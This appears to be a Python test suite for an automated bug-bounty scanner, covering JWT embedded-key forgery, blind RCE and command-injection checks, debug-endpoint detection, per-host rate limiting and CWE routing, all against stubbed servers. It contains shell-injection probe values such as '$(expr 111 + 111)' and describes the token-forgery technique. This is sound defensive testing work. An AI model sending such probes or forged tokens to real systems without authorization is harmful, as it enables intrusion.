        oob.confirm_jwt_key_injection("https://app.example.com/", base=BASE, secret=SECRET,
                                      scope="app.example.com", settings=get_settings(), http=http,
                                      poll_attempts=1, poll_delay_s=0.0)
        replays = [h for h in http.headers_sent if h.get("Cookie")]
        self.assertTrue(replays, "the forged token must ride back in a Cookie header")
        self.assertNotIn("Authorization", replays[0])
        self.assertTrue(replays[0]["Cookie"].startswith("session="))


class OobGovernorSharingTests(unittest.TestCase):
    """A caller that forgets governor= must not get a private per-host allowance."""

    def _records(self):
        seen = []
        real = oob.shared_governor
        self.addCleanup(setattr, oob, "shared_governor", real)

        def spy(**kwargs):
            seen.append(kwargs)
            return real(**kwargs)

        oob.shared_governor = spy
        return seen

    def test_blind_rce_draws_on_the_process_wide_bucket(self) -> None:
        seen = self._records()
        _Collaborator(hit_for=set()).install(self)
        oob.confirm_blind_rce("https://app.example.com/?cmd=x", base=BASE, secret=SECRET,
                              scope="app.example.com", settings=get_settings(),
                              poll_attempts=1, poll_delay_s=0.0, probe_headers=False)
        self.assertTrue(seen, "the shared governor must be used when none is passed")

    def test_the_jwt_key_probe_draws_on_the_process_wide_bucket(self) -> None:
        seen = self._records()
        _Collaborator(hit_for=set()).install(self)
        oob.confirm_jwt_key_injection("https://app.example.com/", base=BASE, secret=SECRET,
                                      scope="app.example.com", settings=get_settings(),
                                      poll_attempts=1, poll_delay_s=0.0)
        self.assertTrue(seen)


class JwtEmbeddedJwkTests(unittest.TestCase):
    """The token carries the key that verifies it — total forgery, and no collaborator needed."""

    REAL = _hs_token("a-strong-secret-that-is-not-in-the-weak-list-9137")
    PAGE = "the authenticated account page for user 42, with private data"

    class _TrustsEmbeddedKey(_FakeHttp):
        """A verifier that reads the jwk header and validates against it (CVE-2018-0114's class)."""

        def __init__(self, real: str, page: str) -> None:
            super().__init__()
            self.real = real
            self.page = page

        def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
            super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
            token = (extra_headers or {}).get("Authorization", "").replace("Bearer ", "")
            try:
                header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
            except Exception:  # noqa: BLE001
                header = {}
            authed = (not token) or token == self.real or "jwk" in header
            body = self.page if authed else "unauthorized"
            return {"status": 200 if authed else 401, "headers": {}, "body": body, "cookies": [],
                    "final_url": url, "location": None, "elapsed": 0.01}

    class _VerifiesProperly(_FakeHttp):
        def __init__(self, real: str, page: str) -> None:
            super().__init__()
            self.real = real
            self.page = page

        def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
            super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
            token = (extra_headers or {}).get("Authorization", "").replace("Bearer ", "")
            authed = (not token) or token == self.real
            return {"status": 200 if authed else 401, "headers": {},
                    "body": self.page if authed else "no", "cookies": [],
                    "final_url": url, "location": None, "elapsed": 0.01}

    def test_self_signed_token_accepted_is_confirmed_critical(self) -> None:
        http = self._TrustsEmbeddedKey(self.REAL, self.PAGE)
        found = av._check_jwt_jwk_embedded(http, "https://app.example.com/me", discovered_token=self.REAL)
        self.assertIsNotNone(found)
        self.assertEqual(found["rule_id"], "active.jwt-jwk-embedded")
        self.assertEqual(found["severity"], "critical")
        self.assertEqual(found["_active_class_hint"], "jwt")
        self.assertEqual(found["_active_proof"]["status"], "confirmed")

    def test_a_server_that_verifies_properly_is_never_claimed(self) -> None:
        http = self._VerifiesProperly(self.REAL, self.PAGE)
        self.assertIsNone(av._check_jwt_jwk_embedded(http, "https://app.example.com/me",
                                                     discovered_token=self.REAL))

    def test_server_that_ignores_signatures_entirely_is_not_attributed_to_jwk(self) -> None:
        # If the corrupted-signature control is ALSO accepted the server verifies nothing, which is a
        # different (bigger) bug -- this check must not take credit for it.
        class _AcceptsAnything(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                return {"status": 200, "headers": {}, "body": JwtEmbeddedJwkTests.PAGE, "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}

        self.assertIsNone(av._check_jwt_jwk_embedded(_AcceptsAnything(), "https://app.example.com/me",
                                                     discovered_token=self.REAL))

    def test_two_hundred_without_the_authenticated_body_is_not_a_bypass(self) -> None:
        # A verifying server can still answer 200 with a public page for a token it refused.
        class _PublicPage(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                token = (extra_headers or {}).get("Authorization", "").replace("Bearer ", "")
                if token == JwtEmbeddedJwkTests.REAL or not token:
                    body, status = JwtEmbeddedJwkTests.PAGE, 200
                elif "jwk" in token:
                    body, status = "our public marketing homepage, nothing private", 200
                else:
                    body, status = "unauthorized", 401
                return {"status": status, "headers": {}, "body": body, "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}

        self.assertIsNone(av._check_jwt_jwk_embedded(_PublicPage(), "https://app.example.com/me",
                                                     discovered_token=self.REAL))

    def test_claims_are_carried_over_unchanged(self) -> None:
        # The proof is "an attacker-chosen key is trusted", never a privilege we granted ourselves.
        http = self._TrustsEmbeddedKey(self.REAL, self.PAGE)
        av._check_jwt_jwk_embedded(http, "https://app.example.com/me", discovered_token=self.REAL)
        sent = [h.get("Authorization", "").replace("Bearer ", "") for h in http.headers_sent if h]
        forged = []
        for token in sent:
            try:
                header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
            except Exception:  # noqa: BLE001
                continue
            if isinstance(header, dict) and "jwk" in header:
                forged.append(token)
        self.assertTrue(forged, "a token carrying an embedded jwk must have been sent")
        self.assertEqual(forged[0].split(".")[1], self.REAL.split(".")[1],
                         "the payload must be the real token's, byte for byte")

    def test_no_token_is_a_no_op_costing_nothing(self) -> None:
        http = _FakeHttp()
        self.assertIsNone(av._check_jwt_jwk_embedded(http, "https://app.example.com/me"))
        self.assertEqual(http.fetched, [])

    def test_minted_jwk_is_a_well_formed_rsa_public_key(self) -> None:
        minted = av._rsa_jwk_and_signer()
        if minted is None:
            self.skipTest("cryptography backend unavailable")
        jwk, sign = minted
        self.assertEqual(jwk["kty"], "RSA")
        self.assertEqual(jwk["alg"], "RS256")
        for field in ("n", "e"):
            self.assertTrue(jwk[field])
            base64.urlsafe_b64decode(jwk[field] + "=" * (-len(jwk[field]) % 4))  # decodes cleanly
        self.assertTrue(sign(b"anything"))


class CommandInjectionBudgetTests(unittest.TestCase):
    """Budget sizing, single registration, and the transient-error handling."""

    def test_command_injection_is_registered_exactly_once(self) -> None:
        # Regression: an earlier draft registered this check TWICE -- a reserved one-parameter slot
        # plus the full sweep -- to guarantee the critical class got budget. With two injectable
        # parameters that emitted TWO critical findings for one endpoint, which a triager penalises,
        # and it also stole the two requests the fixed-budget re-verify path needed to reach XSS. The
        # budget was the real problem; duplicating the registration was not the fix.
        import inspect
        source = inspect.getsource(av.verify_active)
        self.assertEqual(source.count("_check_rce_command_injection(http, sanitized"), 1,
                         "one registration, or a single endpoint yields duplicate criticals")

    def test_the_check_returns_one_finding_even_with_several_injectable_parameters(self) -> None:
        from urllib.parse import urlparse, parse_qsl

        class _ShellEcho(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                echoed = " ".join(v.replace("$(expr 111 + 111)", "222").replace("`expr 111 + 111`", "222")
                                  for _k, v in parse_qsl(urlparse(url).query))
                return {"status": 200, "headers": {}, "body": "<html>" + echoed + "</html>",
                        "cookies": [], "final_url": url, "location": None, "elapsed": 0.01}

        found = av._check_rce_command_injection(_ShellEcho(), "https://app.example.com/?cmd=1&host=2&ping=3")
        self.assertIsNotNone(found)
        self.assertIn("'cmd'", found["title"])  # returns on the FIRST parameter that answers

    def test_one_transient_probe_error_does_not_abandon_the_other_parameters(self) -> None:
        # Regression: the probe fetch used to `break` the parameter loop while its control `continue`d,
        # so a single reset on the first candidate threw away every remaining candidate.
        class _FlakyFirstProbe(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                if "a=" in url and "%24%28" in url:  # the FIRST parameter's probe only
                    raise av._ActiveError("connection reset")
                return {"status": 200, "headers": {}, "body": "nothing echoed", "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}

        http = _FlakyFirstProbe()
        av._check_rce_command_injection(http, "https://app.example.com/?a=1&b=2&c=3")
        self.assertTrue(any("b=" in u for u in http.fetched),
                        "a transient failure on one parameter must not skip the rest")

    def test_budget_seats_the_whole_suite_so_ordering_stops_deciding_recall(self) -> None:
        # Ordering can only ever choose WHICH class starves. The measured worst-case sweep is 99
        # requests (three parameters plus the opt-in timing probes), so the default must exceed it --
        # otherwise the checks at the end of the suite fire nothing, which is the bug being fixed.
        self.assertGreater(av._DEFAULT_REQUESTS_BUDGET, 99)

    def test_default_budget_is_under_the_per_host_governor_ceiling(self) -> None:
        # If the pass budget ever exceeds the bucket, the bucket -- not the budget -- silently decides
        # when a pass stops, and the last checks in the suite never run.
        self.assertLessEqual(av._DEFAULT_REQUESTS_BUDGET, get_settings().active_max_requests_per_host)


class DebugEndpointHonestyTests(unittest.TestCase):
    """An exposed management port is reachability, not a demonstrated execution."""

    class _Serving(_FakeHttp):
        """Answers the Jolokia probe with its real signature and 404s the catch-all control."""

        def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
            super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
            if "/jolokia/list" in url:
                body = '{"request":{"type":"list"},"value":{"java.lang:type=Runtime":{}}}'
                return {"status": 200, "headers": {}, "body": body, "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}
            return {"status": 404, "headers": {}, "body": "not found", "cookies": [],
                    "final_url": url, "location": None, "elapsed": 0.01}

    def test_rce_classed_endpoint_states_that_nothing_was_executed(self) -> None:
        found = av._check_debug_endpoints(self._Serving(), "https://app.example.com/")
        self.assertIsNotNone(found)
        self.assertEqual(found["_active_class_hint"], "rce")
        limitations = found["_active_proof"]["limitations"]
        self.assertIn("NOTHING was executed", limitations)
        self.assertIn("before reporting this as proven RCE", limitations)

    def test_disclosure_classed_endpoints_carry_no_such_caveat(self) -> None:
        class _Heapdump(_FakeHttp):
            def fetch(self, url, *, method="GET", extra_headers=None, read_body=True):
                super().fetch(url, method=method, extra_headers=extra_headers, read_body=read_body)
                if "/actuator/heapdump" in url:
                    return {"status": 200, "headers": {}, "body": "JAVA PROFILE 1.0.2 heapdump-bytes",
                            "cookies": [], "final_url": url, "location": None, "elapsed": 0.01}
                return {"status": 404, "headers": {}, "body": "not found", "cookies": [],
                        "final_url": url, "location": None, "elapsed": 0.01}

        found = av._check_debug_endpoints(_Heapdump(), "https://app.example.com/")
        self.assertIsNotNone(found)
        self.assertEqual(found["_active_class_hint"], "disclosure")
        # The dump IS the impact and the body is the captured artifact -- no caveat to add.
        self.assertEqual(found["_active_proof"]["limitations"], "")


class GovernorLoopbackTests(unittest.TestCase):
    """The politeness delay is for somebody else's server, and the volume cap is for everyone."""

    def test_loopback_is_not_paced(self) -> None:
        from bughunter.rate_limit import HostRateGovernor
        gov = HostRateGovernor(capacity=10, min_interval_s=0.2, refill_per_s=0.0)
        started = time.monotonic()
        for _ in range(5):
            self.assertTrue(gov.throttle("127.0.0.1"))
        self.assertLess(time.monotonic() - started, 0.2)

    def test_a_real_host_is_still_paced(self) -> None:
        from bughunter.rate_limit import HostRateGovernor
        gov = HostRateGovernor(capacity=10, min_interval_s=0.1, refill_per_s=0.0)
        started = time.monotonic()
        for _ in range(3):
            self.assertTrue(gov.throttle("target.example"))
        self.assertGreaterEqual(time.monotonic() - started, 0.15)

    def test_the_volume_cap_still_applies_to_loopback(self) -> None:
        # Only the pacing is waived. The token bucket is what actually bounds what a host absorbs.
        from bughunter.rate_limit import HostRateGovernor
        gov = HostRateGovernor(capacity=2, min_interval_s=0.0, refill_per_s=0.0)
        self.assertEqual([gov.throttle("localhost") for _ in range(3)], [True, True, False])

    def test_loopback_forms_are_all_recognised(self) -> None:
        from bughunter.rate_limit import _is_loopback
        for host in ("127.0.0.1", "127.1.2.3", "localhost", "::1", "[::1]"):
            self.assertTrue(_is_loopback(host), host)
        for host in ("", "example.com", "10.0.0.1", "127.example.com.evil.net", "1270.0.0.1"):
            self.assertFalse(_is_loopback(host), host)


class TaxonomyRoutingTests(unittest.TestCase):
    """A class naming two CWEs must be routable by either of them."""

    def test_every_cwe_in_a_reference_is_returned_in_order(self) -> None:
        self.assertEqual(taxonomy.cwe_numbers("CWE-78 / CWE-94"), ["78", "94"])
        self.assertEqual(taxonomy.cwe_numbers("79"), ["79"])
        self.assertEqual(taxonomy.cwe_numbers("CWE-94 / CWE-94"), ["94"])
        self.assertEqual(taxonomy.cwe_numbers("n/a"), [])
        self.assertEqual(taxonomy.cwe_numbers(None), [])

    def test_cwe_number_still_returns_the_primary(self) -> None:
        self.assertEqual(taxonomy.cwe_number("CWE-78 / CWE-94"), "78")
        self.assertEqual(taxonomy.cwe_number("n/a"), "")

    def test_weakness_routes_through_the_second_cwe_when_only_it_is_enabled(self) -> None:
        # A program that enables CWE-94 but not CWE-78 used to leave a confirmed RCE unrouted.
        enabled = [{"id": "42", "attributes": {"external_id": "cwe-94"}}]
        self.assertEqual(taxonomy.match_weakness_id(enabled, "CWE-78 / CWE-94"), 42)

    def test_primary_cwe_still_wins_when_both_are_enabled(self) -> None:
        enabled = [{"id": "7", "attributes": {"external_id": "cwe-78"}},
                   {"id": "42", "attributes": {"external_id": "cwe-94"}}]
        self.assertEqual(taxonomy.match_weakness_id(enabled, "CWE-78 / CWE-94"), 7)

    def test_rce_is_parented_under_server_side_injection(self) -> None:
        from bughunter.impact_model import bugcrowd_vrt
        self.assertTrue(bugcrowd_vrt("rce").startswith("server_side_injection."))
        self.assertEqual(taxonomy.cwe_to_vrt("CWE-78 / CWE-94"),
                         "Server-Side Injection > Remote Code Execution (RCE)")


if __name__ == "__main__":
    unittest.main()
